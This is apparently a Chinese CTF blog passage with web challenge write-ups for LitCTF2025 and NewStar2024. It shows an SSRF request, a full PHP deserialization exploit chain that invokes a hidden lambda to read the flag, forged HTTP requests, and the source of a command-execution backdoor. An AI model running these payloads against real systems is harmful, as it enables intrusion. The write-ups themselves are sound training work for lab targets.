src="/2025/05/28/LitCTF2025-web/es3.png"></p><p>访问&#x2F;backup&#x2F;8e0132966053d4bf8b2dbe4ede25502b.php，提示非本地用户</p><p>在&#x2F;login.html页面的源码中，发现api.js，查看其源码发现可以打ssrf</p><p><img src="/2025/05/28/LitCTF2025-web/es4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">api</span>/sys/urlcode.php?url=<span class="hljs-number">127.0.0.1</span>/backup/<span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/LitCTF2025-web/es5.png"></p><p>在上一级目录中发现327a6c4304ad5938eaf0efb6cc3e53dc.php</p><p><img src="/2025/05/28/LitCTF2025-web/es6.png"></p><p>直接访问拿到flag</p><h3 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>首先是create_function(“”, ‘die(<code>/readflag</code>);’);会创建一个匿名函数（lambda样式），其创建与执行过程等价于(<a href="https://www.cnblogs.com/zzjdbk/p/12980483.html">https://www.cnblogs.com/zzjdbk/p/12980483.html</a>)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;die(/readflag);&quot;</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">die</span>(/readflag);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么链子就很清晰了</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Taki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__unserialize</span><span class="hljs-params">()</span>==&gt;Mitsuha<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;KatawareDoki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Taki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__call</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>现在就要找一个原生类去调用这个匿名函数</p><p>了解到ReflectionFunction的invoke方法可以调用函数</p><p>最后用一个类来对链子进行包装，然后开头的O就会被自动转换为C</p><blockquote><p>可使用的类：</p><p>ArrayObject::unserialize</p><p>ArrayIterator::unserialize</p><p>RecursiveArrayIterator::unserialize</p><p>SplObjectStorage::unserialize</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Taki#__unserialize()==&gt;Mitsuha#__invoke()==&gt;KatawareDoki#__toString()==&gt;Taki#__call()</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;kuchikamizake = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;name = <span class="hljs-string">&quot;\\00lambda_1&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul-&gt;magic = <span class="hljs-string">&quot;invoke&quot;</span>;<br><br><span class="hljs-variable">$aa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Arrayobject</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aa</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还要注意的一点是匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一</p><p>初次进入靶机后重新进入靶机提交的payload，由1改为了2</p><p><img src="/2025/05/28/LitCTF2025-web/j1.png"></p><blockquote><p><code>create_function()</code> 生成的函数名遵循 <code>lambda_&lt;数字&gt;</code> 的格式（如 <code>lambda_1</code>、<code>lambda_2</code>），其中数字是 PHP 内部维护的计数器。每次调用 <code>create_function()</code> 时，计数器递增，生成唯一名称。</p><p>在 PHP 中，<code>create_function()</code> 生成匿名函数时使用的计数器（即 <code>lambda_&lt;数字&gt;</code> 中的数字）本身<strong>没有明确的理论上限</strong>，其范围取决于 PHP 进程的整数类型（32 位系统最大为 <code>2^31-1</code>，64 位系统最大为 <code>2^63-1</code>）。但在<strong>实际场景中，这个计数器的有效范围非常小</strong>。</p><p>多个ai回答，当计数器达到上限时不会重新置为1，而是会发生整数溢出，如果是有符号整数从负数开始重新计数，如果是无符号整数那么从0开始重新计数，但是我将payload改为lambda_0(如果计数器范围很小的话，有符号整数经过多次爆破也会回到0)时并没有拿到flag，而在一次完整的爆破过程中lambda_1有多个请求拿到了flag，不知道是不是ai错了，看php而文档也并没有看到相关内容</p></blockquote><p>通过bp爆破拿到flag，我这里提交了一个无关紧要来控制爆破次数</p><p><img src="/2025/05/28/LitCTF2025-web/j2.png"></p><p><img src="/2025/05/28/LitCTF2025-web/j3.png"></p><p>看了官方的wp还有一个非预期直接在return ($this-&gt;musubi)();处调用匿名函数，原理是一样的就不写了，贴个官方wp（<a href="https://godyu.com/13917.html%EF%BC%89">https://godyu.com/13917.html）</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2024_web</title>
    <link href="/2025/05/23/NewStar2024-web/"/>
    <url>/2025/05/23/NewStar2024-web/</url>
    
    <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="PangBai过家家（1）"><a href="#PangBai过家家（1）" class="headerlink" title="PangBai过家家（1）"></a>PangBai过家家（1）</h3><p>level1</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_1.png"></p><p>访问&#x2F;3578272f-18fd-432c-915e-df41579719a2路由</p><p>level2：get传ask&#x3D;miao</p><p>level3：post传say&#x3D;hello</p><p>level4：ua头的浏览器引擎改为Papa，post传say&#x3D;玛卡巴卡阿卡哇卡米卡玛卡呣</p><p>level5：用PATCH方法上传一个zip文件，bp抓个包，然后去修改请求包，主要修改部分如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">PATCH<span class="hljs-comment">#将请求方法改为PATCH</span><br><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span>fileupload<span class="hljs-comment">#将请求体的数据类型改为了多部分数据，并加了一个字段间的分隔符</span><br><br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#上传say=玛卡巴卡阿卡哇卡米卡玛卡呣</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;say&quot;</span><br><br>玛卡巴卡阿卡哇卡米卡玛卡呣<br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#上传zip文件</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;patch.zip&quot;</span><br><br><span class="hljs-number">123</span><br><span class="hljs-operator">-</span>-fileupload--<br></code></pre></td></tr></table></figure><p>boundary(字段分隔符)是一个唯一字符，正文的每一部分用–boundary开头，用–boundary–结尾</p><p>bp输入中文只需将需要输入的中文保存为一个文件，然后在输入位置右键选择从文件中粘贴即可</p><p>得到一个token</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_2.png"></p><p>将cookie中的token替换为新得到的token，进入第六关</p><p>第六关：加一个xff头“X-Forwarded-For: 127.0.0.1”</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_3.png"></p><p>有jwt加一个字符串，猜测是进行jwt伪造，改为第0关</p><p><img src="/2025/05/23/NewStar2024-web/pangbai1_4.png"></p><p>替换token后，看一段动画flag就出来了</p><h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><p>flag在响应头</p><p><img src="/2025/05/23/NewStar2024-web/headach3.png"></p><h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><p>第一关：ctrl+u查看页面源码（flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:&#x2F;4cqu1siti0n）</p><p>第二关：看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">revealFlag</span>(<span class="hljs-params">className</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/flag/<span class="hljs-subst">$&#123;className&#125;</span>`</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                    &#125;<br>                &#125;);<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`恭喜你！你获得了第二部分的 flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="hljs-subst">$&#123;data.nextLevel&#125;</span>`</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 控制台提示</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);<br></code></pre></td></tr></table></figure><p>传入正确的className即可，用提示className为4cqu1siti0n，控制台revealFlag(‘4cqu1siti0n’)</p><p>(恭喜你！你获得了第二部分的 flag: IV95NF9yM2Fs …… 时光荏苒，你成长了很多，也发生了一些事情。去看看吧：&#x2F;s34l)</p><p>第三关：看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;seal_him&#x27;</span>);<br>    <span class="hljs-keyword">const</span> stateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>);<br>    <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;message&#x27;</span>);<br><br>    form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>        event.<span class="hljs-title function_">preventDefault</span>();<br><br>  <br>        <span class="hljs-keyword">if</span> (stateElement.<span class="hljs-property">textContent</span>.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">&#x27;解封&#x27;</span>) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;如何是好？&#x27;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                &#125;,<br>                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span> &#125;)<br>            &#125;);<br><br>            <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`第三部分Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败，请重试。&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;);<br>    <br></code></pre></td></tr></table></figure><p>控制台document.getElementById(‘state’).textContent &#x3D; ‘解封’;</p><p>（第三部分Flag: MXlfR3I0c1B, 你解救了五条悟！下一关: &#x2F;Ap3x）</p><p>第四关：前端js限制了表单的默认提交行为，直接通过控制台（或禁用js）</p><blockquote><p>fetch(“&#x2F;api&#x2F;flag&#x2F;Ap3x”, {<br>    method: “POST”,<br>    headers: {<br>        “Content-Type”: “application&#x2F;x-www-form-urlencoded”<br>    },<br>    body: “csrf_token&#x3D;hfaousghashgfasbasiouwrda1_”<br>}).then(r &#x3D;&gt; r.text()).then(console.log);</p></blockquote><p>（{“flag”:”fSkpKcyF9”,”nextLevel”:null}）</p><blockquote><p>完整flag：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</p><p>base64解码：flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p></blockquote><h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><p>robots.txt中得到&#x2F;backd0or.php</p><p>访问得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_cmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt_request</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$decoded_key</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>        <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-variable">$hashed_reversed_cmd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hashed_reversed_cmd</span> !== <span class="hljs-variable">$decoded_key</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid key&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$decrypted_cmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted_cmd</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">execute_cmd</span>(<span class="hljs-title function_ invoke__">decrypt_request</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>一个命令执行函数，一个解密函数</p><p>解密函数将传入的key解码后，对传入的cmd进行反转，如果反转后的cmd的md5值与key解码后的值相等，则解码cmd并返回</p><p>只需将cmd进行base64加密，将加密后的字符串反转然后进行md5加密，将加密后的值再次进行base64加密后赋给key即可</p><blockquote><p>cmd：cat 